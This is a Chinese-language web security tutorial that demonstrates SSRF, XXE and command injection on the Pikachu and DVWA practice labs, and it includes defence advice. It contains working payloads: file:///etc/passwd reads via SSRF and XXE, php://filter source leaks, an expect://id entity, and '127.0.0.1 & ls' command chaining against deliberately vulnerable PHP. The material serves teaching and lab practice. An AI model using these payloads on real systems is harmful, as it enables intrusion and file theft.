<h3 id="h:21195e03-244c-4a24-ac44-cda3adb25390">查看是否存在SSRF漏洞</h3>
<div class="outline-text-3" id="text-h:21195e03-244c-4a24-ac44-cda3adb25390">
<ol class="org-ol">
<li>排除法：浏览器F12查看源代码看是否是在本地进行了请求
举例：资源地址类型为 <a href="http://www.xxx.com/a.php?image=%EF%BC%88%E5%9C%B0%E5%9D%80">http://www.xxx.com/a.php?image=%EF%BC%88%E5%9C%B0%E5%9D%80</a>） 的就可能存在SSRF漏洞。</li>
<li><p>
Dnslog等工具进行测试，查看是否被访问
生成一个域名用于伪造请求，看漏洞服务器是否发起 DNS 解析请求，若成功访问在 <a href="http://dnslog.cn">http://dnslog.cn</a> 上就会有解析日志，查看是客户端地址还是服务端地址。
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">dnslog.cn &#28857;&#20987;Get subdomain&#65292;&#23558;&#24471;&#21040;&#30340;&#22495;&#21517;&#25918;&#21040;&#25991;&#20214;&#21253;&#21547;&#25110;&#32773;SSRF&#28431;&#27934;&#38142;&#25509;&#22788;&#29702;</span>
http://www.xxx.com/a.php?<span style="color: #a0522d;">image</span>=http://bljjfg.dnslog.cn
</pre>
</div></li>
<li>抓包分析（wireshark）发送的请求是不是由服务器发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址。</li>
<li>访问日志检查：伪造请求到自己控制的公网服务器，然后在服务器上查看访问日志是否有来自漏洞服务器的请求。</li>
<li>扫描工具。</li>
</ol>
</div>
</div>
<div id="outline-container-h:58d96a3d-1ade-44d3-8a83-de86fed959b1" class="outline-3">
<h3 id="h:58d96a3d-1ade-44d3-8a83-de86fed959b1">Pikachu演示</h3>
<div class="outline-text-3" id="text-h:58d96a3d-1ade-44d3-8a83-de86fed959b1">
</div>
<div id="outline-container-h:b8668c67-e694-4098-a5f1-d9126eabdc51" class="outline-4">
<h4 id="h:b8668c67-e694-4098-a5f1-d9126eabdc51">SSRF（curl）</h4>
<div class="outline-text-4" id="text-h:b8668c67-e694-4098-a5f1-d9126eabdc51">
<p>
首先我们大概了解一下在PHP中curl函数是用来干什么的。curl是一个库，能让你通过URL和许多不同的服务器进行交流，并且还支持多个协议，重点是可以用来请求Web服务器。curl可以支持https认证、http post、ftp上传、代理、cookies、简单口令认证等等功能。
</p>

<p>
打开目标网站，并根据提示点击。
</p>
<ul class="org-ul">
<li>SSRF &#x2013;&gt; SSRF(curl) 点击文字</li>
</ul>


<figure id="org1b10a10">
<img src="./images/img_20230717_150643.png" alt="img_20230717_150643.png" width="50%">

</figure>

<p>
靶场有点问题文字显示不出来，返回url中多写了vul/，去掉就能显示
</p>
<div class="org-src-container">
<pre class="src src-sh">http://124.222.171.19:8083/vul/ssrf/ssrf_curl.php?<span style="color: #a0522d;">url</span>=http://127.0.0.1/vul/vul/ssrf/ssrf_info/info1.php

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#21435;&#25481;&#22810;&#20889;&#30340;vul/</span>
http://124.222.171.19:8083/vul/ssrf/ssrf_curl.php?<span style="color: #a0522d;">url</span>=http://127.0.0.1/vul/ssrf/ssrf_info/info1.php
</pre>
</div>


<p>
观察URL，发现它传递了一个URL给后台
</p>



<figure id="orgf1c9577">
<img src="./images/img_20230717_150702.png" alt="img_20230717_150702.png" width="50%">

</figure>



<p>
我们可以把URL中的内容改为百度
</p>

<div class="org-src-container">
<pre class="src src-sh">http://127.0.0.1/vul/ssrf/ssrf_fgc.php?<span style="color: #a0522d;">url</span>=https://www.baidu.com
http://127.0.0.1/vul/ssrf/ssrf_fgc.php?<span style="color: #a0522d;">url</span>=https://www.baidu.com@www.xxx.com
</pre>
</div>


<figure id="org38009c8">
<img src="./images/img_20230717_151145.png" alt="img_20230717_151145.png" width="50%">

</figure>

<p>
还可以利用file协议读取本地文件
</p>

<div class="org-src-container">
<pre class="src src-sh">http://127.0.0.1:8000/vul/ssrf/ssrf_curl.php?<span style="color: #a0522d;">url</span>=file:///etc/passwd
</pre>
</div>



<figure id="orgb8fbe1f">
<img src="./images/img_20230717_151241.png" alt="img_20230717_151241.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:e6a39906-7082-4f83-9007-a6d40035d67c" class="outline-4">
<h4 id="h:e6a39906-7082-4f83-9007-a6d40035d67c">SSRF（file_get_content）</h4>
<div class="outline-text-4" id="text-h:e6a39906-7082-4f83-9007-a6d40035d67c">
<p>
file_get_contents() 函数的作用是把整个文件读入一个字符串中，是用于将文件的内容读入到一个字符串中的首选方法。
</p>

<p>
php://filter：是一种元封装器， 设计用于数据流打开时的<a href="https://www.php.net/manual/zh/filters.php">筛选过滤</a>应用。 对于一体式（all-in-one）的文件函数非常有用，类似 <a href="https://www.php.net/manual/zh/function.readfile.php">readfile()</a>、 <a href="https://www.php.net/manual/zh/function.file.php">file()</a> 和 <a href="https://www.php.net/manual/zh/function.file-get-contents.php">file_get_contents()</a>，在数据流内容读取之前没有机会应用其他过滤器。
</p>

<p>
<a href="https://www.php.net/manual/en/wrappers.php.php">php://filter</a> 目标使用以下的参数作为它路径的一部分，复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。
</p>

<table>


<colgroup>
<col  class="org-left">

<col  class="org-left">
</colgroup>
<tbody>
<tr>
<td class="org-left">名称</td>
<td class="org-left">描述</td>
</tr>

<tr>
<td class="org-left">resource=&lt;要过滤的数 据流&gt;</td>
<td class="org-left">这个参数是必须的。它指定了你要筛选过滤的数据流，即要读的文件。</td>
</tr>

<tr>
<td class="org-left">read=&lt;读链的筛选列表&gt;</td>
<td class="org-left">该参数可选。可以设定一个或多个过滤器名称，以管道符（ &vert; ）分隔。</td>
</tr>

<tr>
<td class="org-left">write=&lt;写链的筛选列表 &gt;</td>
<td class="org-left">该参数可选。可以设定一个或多个过滤器名称，以管道符（ &vert; ）分隔。</td>
</tr>

<tr>
<td class="org-left">&lt;；两个链的筛选列表&gt;</td>
<td class="org-left">任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</td>
</tr>
</tbody>
</table>


<p>
<a href="https://www.php.net/manual/en/wrappers.php.php">php://filter文档</a>
</p>

<p>
file_get_contents里面带有php://filter 我们用它就可以来读取php源码，所以来构造URL：
</p>

<div class="org-src-container">
<pre class="src src-sh">http://127.0.0.1/vul/ssrf/ssrf_fgc.php?<span style="color: #a0522d;">file</span>=php://filter/resource=ssrf.php&#65288;&#20250;&#34987;&#35299;&#26512;&#65289;
</pre>
</div>


<p>
直接使用 resource 指定 ssrf.php 文件，可以看到访问成功
</p>



<figure id="org1d65e56">
<img src="./images/img_20230717_155113.png" alt="img_20230717_155113.png" width="50%">

</figure>

<p>
但是php文件被解析了，我们希望拿到网站的源代码，那么我们需要对代码做一层编码，不让它解析，拿到之后我们再进行解码，这样就拿到了网站的源代码；在read参数中加入 convert.base64-encode
</p>

<p>
<a href="https://www.php.net/manual/zh/filters.convert.php">convert.base64-encode文档</a>
</p>

<div class="org-src-container">
<pre class="src src-sh">http://127.0.0.1/vul/ssrf/ssrf_fgc.php?<span style="color: #a0522d;">file</span>=php://filter/read=convert.base64-encode/resource=ssrf.php
</pre>
</div>

<p>
然后网页出现了base64编码的代码
</p>



<figure id="org5e3e8dc">
<img src="./images/img_20230717_160000.png" alt="img_20230717_160000.png" width="50%">

</figure>

<p>
利用解码工具或hackbar进行解码：<a href="https://base64.us/">https://base64.us/</a>
</p>
</div>
</div>
</div>
<div id="outline-container-h:7db87cdd-38fa-48c4-a8cc-1a100e1a54ea" class="outline-3">
<h3 id="h:7db87cdd-38fa-48c4-a8cc-1a100e1a54ea">漏洞修复</h3>
<div class="outline-text-3" id="text-h:7db87cdd-38fa-48c4-a8cc-1a100e1a54ea">
<ol class="org-ol">
<li>设置URL白名单或者黑名单内网IP；
<ul class="org-ul">
<li>尽量白名单</li>
</ul></li>
<li>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果Web应用是去获取某一种类型的文件，那么在将返回结果展示给用户之前先验证返回的信息是否符合标准；</li>
<li>禁用不需要的协议，仅仅允许http和https请求，可以防止类似于 <code>file:///,gopher://,ftp://</code> 等引起的</li>
</ol>
<p>
问题。
</p>
</div>
</div>
</section>
<section id="outline-container-h:6fc7b780-abcb-4608-920b-6378936449b9" class="outline-2">
<h2 id="h:6fc7b780-abcb-4608-920b-6378936449b9">XXE 原理利用防御</h2>
<div class="outline-text-2" id="text-h:6fc7b780-abcb-4608-920b-6378936449b9">
<p>
主要内容：
</p>
<ul class="org-ul">
<li>XXE 基础知识</li>
<li>XXE 漏洞攻防测试</li>
</ul>
</div>
<div id="outline-container-h:42bc4153-05e8-44b2-acdd-510a6127a436" class="outline-3">
<h3 id="h:42bc4153-05e8-44b2-acdd-510a6127a436">简介</h3>
<div class="outline-text-3" id="text-h:42bc4153-05e8-44b2-acdd-510a6127a436">
<p>
XXE：XML External Entity（XML外部实体），从安全角度理解成XML External Entity attack（外部实体注入攻击）。由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的漏洞。
</p>

<p>
例如PHP中的simplexml_load默认情况下会解析外部实体，有XXE漏洞的标志性函数是simplexml_load_string()。
</p>
</div>
</div>
<div id="outline-container-h:f0c9aa3c-0f10-49b6-89c3-f584ffec13d6" class="outline-3">
<h3 id="h:f0c9aa3c-0f10-49b6-89c3-f584ffec13d6">XML外部实体</h3>
<div class="outline-text-3" id="text-h:f0c9aa3c-0f10-49b6-89c3-f584ffec13d6">
<p>
XML是用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。
</p>

<p>
首先让我们了解一下XML的基本结构，其中主要关注[DTD-实体]：
</p>
<ul class="org-ul">
<li>XML 文档声明，在文档的第一行</li>
<li>XML 文档类型定义，即DTD，XXE 漏洞所在的地方</li>
<li>XML 文档元素</li>
</ul>



<figure id="org45de7aa">
<img src="./images/img_20230717_164102.png" alt="img_20230717_164102.png" width="50%">

</figure>

<p>
DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。XML文档类型的声明如下：
</p>

<div class="org-src-container">
<pre class="src src-sh">&#20869;&#37096;&#22768;&#26126;DTD &lt;!DOCTYPE &#26681;&#20803;&#32032; [&#20803;&#32032;&#22768;&#26126;]&gt;
&#22806;&#37096;&#22768;&#26126;DTD &lt;!DOCTYPE &#26681;&#20803;&#32032; SYSTEM <span style="color: #8b2252;">"&#25991;&#20214;&#21517;"</span>&gt;

&#20030;&#20363;&#65306;&lt;!DOCTYPE note SYSTEM <span style="color: #8b2252;">"Note.dtd"</span>&gt; &#25110;&#32773; &lt;!DOCTYPE &#26681;&#20803;&#32032; PUBLIC <span style="color: #8b2252;">"public_ID"</span> <span style="color: #8b2252;">"&#25991; &#20214;&#21517;"</span>&gt;
</pre>
</div>

<p>
实例1.1：内部声明DTD
</p>

<div class="org-src-container">
<pre class="src src-sh">&lt;?xml <span style="color: #a0522d;">version</span>=<span style="color: #8b2252;">"1.0"</span>?&gt; //xml&#22768;&#26126; 

&lt;!DOCTYPE note [ 
&lt;!ELEMENT note (to,from,heading,body)&gt; //&#23450;&#20041;&#20102;note&#20803;&#32032;&#65292;&#24182;&#19988;note&#20803;&#32032;&#19979;&#38754;&#26377;4&#20010;&#23376;&#20803; &#32032;
&lt;!ELEMENT to (<span style="color: #b22222;">#</span><span style="color: #b22222;">PCDATA)&gt; //&#23450;&#20041;&#20102;&#23376;&#20803;&#32032;to&#65292;&#21518;&#38754;&#30340;&#65288;&#65283;PCDATA&#65289;&#24847;&#24605;&#26159;to &#20803;&#32032;&#37324;&#38754;&#30340;&#23383;&#31526;&#20018;&#20869;&#23481;&#19981;&#20250;&#34987;&#35299;&#26512; </span>
&lt;!ELEMENT from (<span style="color: #b22222;">#</span><span style="color: #b22222;">PCDATA)&gt;</span>
&lt;!ELEMENT heading (<span style="color: #b22222;">#</span><span style="color: #b22222;">PCDATA)&gt;</span>
&lt;!ELEMENT body (<span style="color: #b22222;">#</span><span style="color: #b22222;">PCDATA)&gt; ]&gt; //&#20174;&lt;!DOCTYPE...&#21040;]&gt;,&#26159;DTD&#25991;&#26723;&#30340;&#23450;&#20041; </span>
&lt;note&gt;
    &lt;to&gt;George&lt;/to&gt;
    &lt;from&gt;John&lt;/from&gt;
    &lt;heading&gt;Reminder&lt;/heading&gt;
    &lt;body&gt;Don<span style="color: #8b2252;">'t forget the meeting!&lt;/body&gt;</span>
<span style="color: #8b2252;">&lt;/note&gt; //&#21518;&#38754;&#36825;&#37096;&#20998;&#23601;&#26159;XML&#25991;&#20214;&#20869;&#23481;</span>
</pre>
</div>

<p>
实例1.2：外部声明DTD
</p>

<div class="org-src-container">
<pre class="src src-sh">&lt;?xml <span style="color: #a0522d;">version</span>=<span style="color: #8b2252;">"1.0"</span>?&gt;
&lt;!DOCTYPE note SYSTEM <span style="color: #8b2252;">"note.dtd"</span>&gt;
&lt;note&gt;
    &lt;to&gt;George&lt;/to&gt;
    &lt;from&gt;John&lt;/from&gt;
    &lt;heading&gt;Reminder&lt;/heading&gt;
    &lt;body&gt;Don<span style="color: #8b2252;">'t forget the meeting!&lt;/body&gt;</span>
<span style="color: #8b2252;">&lt;/note&gt;</span>
</pre>
</div>

<p>
这个note.dtd的内容就是:
</p>

<div class="org-src-container">
<pre class="src src-sh">&lt;!DOCTYPE note [ 
&lt;!ELEMENT note (to,from,heading,body)&gt;
&lt;!ELEMENT to (<span style="color: #b22222;">#</span><span style="color: #b22222;">PCDATA)&gt;</span>
&lt;!ELEMENT from (<span style="color: #b22222;">#</span><span style="color: #b22222;">PCDATA)&gt;</span>
&lt;!ELEMENT heading (<span style="color: #b22222;">#</span><span style="color: #b22222;">PCDATA)&gt;</span>
&lt;!ELEMENT body (<span style="color: #b22222;">#</span><span style="color: #b22222;">PCDATA)&gt; ]&gt;</span>
</pre>
</div>

<p>
DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用
</p>

<div class="org-src-container">
<pre class="src src-sh">&#20869;&#37096;&#22768;&#26126;&#23454;&#20307; &lt;!DOCTYPE &#23454;&#20307;&#21517;&#31216; <span style="color: #8b2252;">"&#23454;&#20307;&#30340;&#20540;"</span>&gt; 
&#24341;&#29992;&#22806;&#37096;&#23454;&#20307; &lt;!DOCTYPE &#23454;&#20307;&#21517;&#31216; SYSTEM <span style="color: #8b2252;">"URL"</span>&gt; &#25110;&#32773; &lt;!DOCTYPE &#23454;&#20307;&#21517;&#31216; PUBLIC <span style="color: #8b2252;">"public_ID"</span> <span style="color: #8b2252;">"URL"</span>&gt;
</pre>
</div>

<p>
实例2.1：内部声明实体
</p>

<div class="org-src-container">
<pre class="src src-sh">&lt;?xml <span style="color: #a0522d;">version</span>=<span style="color: #8b2252;">"1.0"</span>?&gt;
&lt;!DOCTYPE note[ 
&lt;!ELEMENT note (name)&gt;
&lt;!ENTITY hack3r <span style="color: #8b2252;">"Hu3sky"</span>&gt; ]&gt;
&lt;note&gt;
    &lt;name&gt;&amp;hack3r;&lt;/name&gt;
&lt;/note&gt;
</pre>
</div>

<p>
实例2.2：引用外部实体
</p>

<p>
外部实体用来引用外部资源，有两个关键字SYSTEM和PUBLIC两个，表示实体来自本地计算机还是公共计算机，外部实体的利用会用到协议如下:
</p>

<p>
不同语言下支持的协议：
</p>
<ul class="org-ul">
<li>libxml2
<ul class="org-ul">
<li>file</li>
<li>http</li>
<li>ftp</li>
</ul></li>
<li>PHP
<ul class="org-ul">
<li>file</li>
<li>http</li>
<li>ftp</li>
<li>php</li>
<li>compress.zlib</li>
<li>compress.bzip2</li>
<li>data</li>
<li>glob</li>
<li>phar</li>
</ul></li>
<li>Java
<ul class="org-ul">
<li>http</li>
<li>https</li>
<li>ftp</li>
<li>file</li>
<li>jar</li>
<li>netdoc</li>
<li>mailto</li>
<li><code>gopher *</code></li>
</ul></li>
<li>.NET
<ul class="org-ul">
<li>file</li>
<li>http</li>
<li>https</li>
<li>ftp</li>
</ul></li>
</ul>

<p>
正因为外部实体支持的http、file等协议，那么就有可能通过引用外部实体进行远程文件读取。
</p>
</div>
</div>
<div id="outline-container-h:7ebef884-a0d1-494d-a478-cafbe17d414a" class="outline-3">
<h3 id="h:7ebef884-a0d1-494d-a478-cafbe17d414a">危害</h3>
<div class="outline-text-3" id="text-h:7ebef884-a0d1-494d-a478-cafbe17d414a">
<p>
当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。
</p>
</div>
<div id="outline-container-h:3eba7610-5dd7-45e8-bbb5-5056a7a94c93" class="outline-4">
<h4 id="h:3eba7610-5dd7-45e8-bbb5-5056a7a94c93">读取任意文件</h4>
<div class="outline-text-4" id="text-h:3eba7610-5dd7-45e8-bbb5-5056a7a94c93">
<p>
PHP中可以通过FILE协议、HTTP协议和FTP协议读取文件，还可利用PHP伪协议。
</p>

<div class="org-src-container">
<pre class="src src-sh">&lt;?xml <span style="color: #a0522d;">version</span>=<span style="color: #8b2252;">"1.0"</span>?&gt;
&lt;!DOCTYPE xxx[ 
    &lt;!ENTITY f SYSTEM <span style="color: #8b2252;">"file:///etc/passwd"</span>&gt; 
]&gt;
&lt;hhh&gt;&amp;f;&lt;/hhh&gt;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:9c054cbd-7679-4f3d-90dd-93552979face" class="outline-4">
<h4 id="h:9c054cbd-7679-4f3d-90dd-93552979face">执行系统命令</h4>
<div class="outline-text-4" id="text-h:9c054cbd-7679-4f3d-90dd-93552979face">
<p>
这种情况很少发生，但在配置不当或者开发内部应用情况下（PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上），攻击者能够通过XXE执行代码。
</p>

<div class="org-src-container">
<pre class="src src-sh">&lt;?xml <span style="color: #a0522d;">version</span>=<span style="color: #8b2252;">"1.0"</span>?&gt;
&lt;!DOCTYPE xxx[ 
    &lt;!ENTITY f SYSTEM <span style="color: #8b2252;">"expect://id"</span>&gt; 
]&gt;
&lt;hhh&gt;&amp;f;&lt;/hhh&gt;
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:30bada5d-122b-491a-86a3-7133217a70f9" class="outline-3">
<h3 id="h:30bada5d-122b-491a-86a3-7133217a70f9">Pikachu演示</h3>
<div class="outline-text-3" id="text-h:30bada5d-122b-491a-86a3-7133217a70f9">
<p>
我们先输入一个合法的xml文档：
</p>

<div class="org-src-container">
<pre class="src src-sh">&lt;?xml <span style="color: #a0522d;">version</span>=<span style="color: #8b2252;">"1.0"</span> <span style="color: #a0522d;">encoding</span>=<span style="color: #8b2252;">"UTF-8"</span> ?&gt;
&lt;!DOCTYPE note [ 
    &lt;!ENTITY hack <span style="color: #8b2252;">"xxx"</span>&gt; 
]&gt;
&lt;name&gt;&amp;hack;&lt;/name&gt;
</pre>
</div>


<p>
提交之后，发现成功解析了，说明网页对输入的xml数据是有结果回显的
</p>



<figure id="orgbd3ad64">
<img src="./images/img_20230717_170448.png" alt="img_20230717_170448.png" width="50%">

</figure>

<p>
在服务端开启了DTD外部引用且没有对DTD对象进行过滤的情况下，可以利用DTD引用系统关键文件:
</p>

<div class="org-src-container">
<pre class="src src-sh">&lt;?xml <span style="color: #a0522d;">version</span>=<span style="color: #8b2252;">"1.0"</span>?&gt;
&lt;!DOCTYPE ANY [ 
&lt;!ENTITY xxx SYSTEM <span style="color: #8b2252;">"file:///etc/passwd"</span>&gt;
]&gt;
&lt;x&gt;&amp;xxx;&lt;/x&gt;
</pre>
</div>



<figure id="org1452898">
<img src="./images/img_20230717_170637.png" alt="img_20230717_170637.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:5152f6ec-4581-408a-9d53-6d9f0644ade8" class="outline-3">
<h3 id="h:5152f6ec-4581-408a-9d53-6d9f0644ade8">XXE的防御</h3>
<div class="outline-text-3" id="text-h:5152f6ec-4581-408a-9d53-6d9f0644ade8">
</div>
<div id="outline-container-h:7544ef96-b602-46bb-9801-f52f484faec9" class="outline-4">
<h4 id="h:7544ef96-b602-46bb-9801-f52f484faec9">禁用外部实体</h4>
<div class="outline-text-4" id="text-h:7544ef96-b602-46bb-9801-f52f484faec9">
<div class="org-src-container">
<pre class="src src-sh">//php:
<span style="color: #0000ff;">libxml_disable_entity_loader</span>(true);

//java:
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
<span style="color: #0000ff;">dbf.setExpandEntityReferences</span>(false);

//Python&#65306;
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(<span style="color: #a0522d;">resolve_entities</span>=False))
</pre>
</div>
</div>
</div>
<div id="outline-container-h:9a686418-a232-4885-bc44-a0b6b6fee3c0" class="outline-4">
<h4 id="h:9a686418-a232-4885-bc44-a0b6b6fee3c0">过滤用户提交的XML数据</h4>
<div class="outline-text-4" id="text-h:9a686418-a232-4885-bc44-a0b6b6fee3c0">
<div class="org-src-container">
<pre class="src src-sh">&#36807;&#28388;&#20851;&#38190;&#35789;&#65306; &lt;!DOCTYPE &#21644; &lt;!ENTITY&#65292;&#25110;&#32773; SYSTEM &#21644; PUBLIC
</pre>
</div>
</div>
</div>
</div>
</section>
<section id="outline-container-h:4f4e5d18-a63e-4e5c-b0ab-c9e86d373e51" class="outline-2">
<h2 id="h:4f4e5d18-a63e-4e5c-b0ab-c9e86d373e51">远程代码执行</h2>
<div class="outline-text-2" id="text-h:4f4e5d18-a63e-4e5c-b0ab-c9e86d373e51">
<p>
主要内容：
</p>
<ul class="org-ul">
<li>远程代码执行原理介绍</li>
<li>PHP 远程代码执行常用函数演示</li>
<li>RCE 漏洞
<ul class="org-ul">
<li>Log4j2 RCE 漏洞介绍及攻击还原</li>
<li>Shiro RCE 漏洞介绍及攻击还原</li>
<li>Struts2 RCE 漏洞介绍及攻击还原</li>
<li>ThinkPHP RCE 漏洞介绍及攻击还原</li>
<li>Weblogic RCE 漏洞介绍及攻击还原</li>
</ul></li>
</ul>
</div>
<div id="outline-container-h:9160cf7d-8b22-42cd-8956-891a19945529" class="outline-3">
<h3 id="h:9160cf7d-8b22-42cd-8956-891a19945529">什么是RCE？</h3>
<div class="outline-text-3" id="text-h:9160cf7d-8b22-42cd-8956-891a19945529">
<p>
RCE英文全称：remote command/code execute，分为 远程命令执行（比如ping） 和 远程代码执行（比如eval）。
</p>

<p>
RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。
</p>


<p>
实际上 RCE 是一种攻击效果，要实现这一效果它所利用的漏洞就太多了：
</p>
<ul class="org-ul">
<li>sql 注入</li>
<li>文件上传</li>
<li>文件包含</li>
<li>中间件、组件漏洞</li>
<li>操作系统漏洞</li>
<li>等等</li>
</ul>
</div>
<div id="outline-container-h:9520436c-f06a-4c81-a8b2-e1b83586a470" class="outline-4">
<h4 id="h:9520436c-f06a-4c81-a8b2-e1b83586a470">远程命令执行</h4>
<div class="outline-text-4" id="text-h:9520436c-f06a-4c81-a8b2-e1b83586a470">
<p>
出现原因：因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。
</p>

<p>
比如常见的路由器、防火墙、入侵检测等设备的Web管理界面上，一般会给用户提供一个ping操作的web界面，用户从Web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。而如果设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而控制整个后台服务器。
</p>

<p>
Ping是Windows、Unix和Linux系统下的一个命令。ping也属于一个通信协议，是TCP/IP协议的一部分。利用“ping”命令可以检查网络是否连通，可以很好地帮助我们分析和判定网络故障。应用格式：
</p>

<p>
ping + IP地址，如图：
</p>



<figure id="orgd73b75c">
<img src="./images/img_20230717_171102.png" alt="img_20230717_171102.png" width="50%">

</figure>

<p>
例如：如今很多甲方企业的自动化运维平台，大量的系统操作会通过“自动化运维”平台进行操作，其中往往会出现远程系统命令执行的漏洞。
</p>
</div>
</div>
<div id="outline-container-h:6bbd5789-1120-4be4-a805-a680cd4485ad" class="outline-4">
<h4 id="h:6bbd5789-1120-4be4-a805-a680cd4485ad">远程代码执行</h4>
<div class="outline-text-4" id="text-h:6bbd5789-1120-4be4-a805-a680cd4485ad">
<p>
出现原因：因为需求设计，后台有时候会把用户的输入作为代码的一部分进行执行，也造成了远程代码执行漏洞。
</p>
</div>
</div>
<div id="outline-container-h:5a853a0c-84ef-437b-8298-dcc0cbdac824" class="outline-4">
<h4 id="h:5a853a0c-84ef-437b-8298-dcc0cbdac824">防御</h4>
<div class="outline-text-4" id="text-h:5a853a0c-84ef-437b-8298-dcc0cbdac824">
<p>
如果需要给前端用户提供操作类的API接口，一定需要对接口的输入的内容进行严格的判断，比如实施严格的白名单是一个好的方法。
</p>
</div>
</div>
</div>
<div id="outline-container-h:6a0e2d70-09c0-4836-bf4e-91d36085ec5d" class="outline-3">
<h3 id="h:6a0e2d70-09c0-4836-bf4e-91d36085ec5d">DVWA演示</h3>
<div class="outline-text-3" id="text-h:6a0e2d70-09c0-4836-bf4e-91d36085ec5d">
<p>
Command Injection
</p>
</div>
<div id="outline-container-h:c495ab32-6185-4c9f-997c-72b0c9195ecd" class="outline-4">
<h4 id="h:c495ab32-6185-4c9f-997c-72b0c9195ecd">Low级别</h4>
<div class="outline-text-4" id="text-h:c495ab32-6185-4c9f-997c-72b0c9195ecd">
<p>
该处设置一个ping功能，输入一个IP地址即可以从服务器对该地址执行ping操作。源代码如下：
</p>

<div class="org-src-container">
<pre class="src src-sh">&lt;? php
<span style="color: #a020f0;">if</span> (isset($<span style="color: #a0522d;">_POST</span>[<span style="color: #8b2252;">'Submit'</span>])) {
    // Get input 
    $<span style="color: #a0522d;">target</span> = $<span style="color: #a0522d;">_REQUEST</span>[<span style="color: #8b2252;">'ip'</span>];
    // Determine OS and execute the ping command. 
    <span style="color: #a020f0;">if</span> (stristr(php_uname(<span style="color: #8b2252;">'s'</span>), <span style="color: #8b2252;">'Windows NT'</span>)) {
        // Windows 
        $<span style="color: #a0522d;">cmd</span> = shell_exec(<span style="color: #8b2252;">'ping '</span> . $<span style="color: #a0522d;">target</span>);
    } <span style="color: #a020f0;">else</span> {
        // *nix 
        $<span style="color: #a0522d;">cmd</span> = shell_exec(<span style="color: #8b2252;">'ping -c 4 '</span> . $<span style="color: #a0522d;">target</span>);
    }
    // Feedback for the end user 
    <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">"&lt;pre&gt;{$cmd}&lt;/pre&gt;"</span>;
} 
?&gt;
</pre>
</div>

<p>
target参数为将要ping的ip地址，比如在输入框输入127.0.0.1。
</p>

<p>
命令行的几种操作方式：
</p>

<ul class="org-ul">
<li>A &amp;&amp; B： 先执行A，如果成功，执行B；</li>
<li>A || B： 先执行A，如果失败，执行B；</li>
<li>A | B：管道符，先执行A后，将A的结果作为B的输入，打印的是B的结果；</li>
<li>A &amp; B： 先执行A，然后不管成功与否，执行B；</li>
</ul>

<p>
再看上面的源代码，可以想到在ping命令后可以尝试其他命令的拼接，比如在linux系统中执行 <code>ping 127.0.0.1 &amp; ls</code> ，则会先运行ping指令，之后执行ls指令，列出当前文件夹的内容。那么在这个地方同样可以进行拼接，输入框中填入 <code>127.0.0.1 &amp; ls</code> ，这些内容都会作为target参数传入服务器从而拼接出整个系统命令并执行。
</p>

<p>
攻击效果如图：
</p>


<figure id="org98e3d16">
<img src="./images/img_20230717_171558.png" alt="img_20230717_171558.png" width="50%">

</figure>

<div class="org-src-container">
<pre class="src src-sh">127.0.0.1 &amp; ls
</pre>
</div>


<figure id="org5143874">
<img src="./images/img_20230717_171631.png" alt="img_20230717_171631.png" width="50%">

</figure>
</div>
</div>
<div id="outline-container-h:9d856801-5c59-4f5e-8af8-78166fa340a5" class="outline-4">
<h4 id="h:9d856801-5c59-4f5e-8af8-78166fa340a5">Medium级别</h4>
<div class="outline-text-4" id="text-h:9d856801-5c59-4f5e-8af8-78166fa340a5">
<p>
Medium只对&amp;&amp;与;两种符号进行过滤，所以用其他的 <code>||,|,&amp;</code> 同样可以进行攻击。
</p>

<div class="org-src-container">
<pre class="src src-sh">&lt;?php

<span style="color: #a020f0;">if</span>( isset( $<span style="color: #a0522d;">_POST</span>[ <span style="color: #8b2252;">'Submit'</span> ]  ) ) {
    // Get input
    $<span style="color: #a0522d;">target</span> = $<span style="color: #a0522d;">_REQUEST</span>[ <span style="color: #8b2252;">'ip'</span> ];

    // Set blacklist
    $<span style="color: #a0522d;">substitutions</span> = array(
        <span style="color: #8b2252;">'&amp;&amp;'</span> =&gt; <span style="color: #8b2252;">''</span>,
        <span style="color: #8b2252;">';'</span>  =&gt; <span style="color: #8b2252;">''</span>,
    );

    // Remove any of the charactars<span style="color: #a020f0;"> in</span> the array (blacklist)<span style="color: #483d8b;">.</span>
    $<span style="color: #a0522d;">target</span> = str_replace( array_keys( $<span style="color: #a0522d;">substitutions</span> ), $<span style="color: #a0522d;">substitutions</span>, $<span style="color: #a0522d;">target</span> );

    // Determine OS and execute the ping command.
    <span style="color: #a020f0;">if</span>( stristr( php_uname( <span style="color: #8b2252;">'s'</span> ), <span style="color: #8b2252;">'Windows NT'</span> ) ) {
        // Windows
        $<span style="color: #a0522d;">cmd</span> = shell_exec( <span style="color: #8b2252;">'ping  '</span> . $<span style="color: #a0522d;">target</span> );
    }
    <span style="color: #a020f0;">else</span> {
        // *nix
        $<span style="color: #a0522d;">cmd</span> = shell_exec( <span style="color: #8b2252;">'ping  -c 4 '</span> . $<span style="color: #a0522d;">target</span> );
    }

    // Feedback for the end user
    <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">"&lt;pre&gt;{$cmd}&lt;/pre&gt;"</span>;
}

